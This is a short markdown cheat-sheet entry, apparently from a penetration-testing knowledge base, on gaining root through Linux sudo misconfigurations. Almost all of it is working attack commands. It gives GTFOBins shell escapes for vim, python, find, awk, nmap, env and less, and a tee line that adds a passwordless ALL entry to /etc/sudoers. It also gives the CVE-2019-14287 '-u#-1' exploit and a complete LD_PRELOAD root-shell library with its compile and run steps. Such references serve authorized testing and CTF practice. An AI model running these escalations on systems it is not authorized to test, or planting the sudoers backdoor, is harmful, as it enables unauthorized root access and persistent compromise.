---
id: linux-sudo
title: Linux Sudo Abuse
stage: privesc
tags: [linux]
tools:
  - sudo -l
  - sudo -u#-1 /bin/bash
leads_to:
  - root-linux
---

## Check

```bash
sudo -l
```

## GTFOBins Quick Reference

```bash
# vim
sudo vim -c '!bash'

# python / python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# find
sudo find . -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# nmap (old version)
sudo nmap --interactive
nmap> !sh

# env
sudo env /bin/bash

# less / more
sudo less /etc/hosts
!/bin/bash

# tee (write as root)
echo "user ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
```

## CVE-2019-14287 (sudo < 1.8.28)

```bash
sudo -V    # check version
# Exploitable if: version < 1.8.28 AND sudo -l shows (ALL) on any binary
sudo -u#-1 /bin/bash
```

## LD_PRELOAD (if env_keep+=LD_PRELOAD in sudo -l output)

```bash
cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/find
```

## Notes

Always check GTFOBins for any binary found in `sudo -l` output — https://gtfobins.github.io/. Even restricted binaries often have shell escape methods.
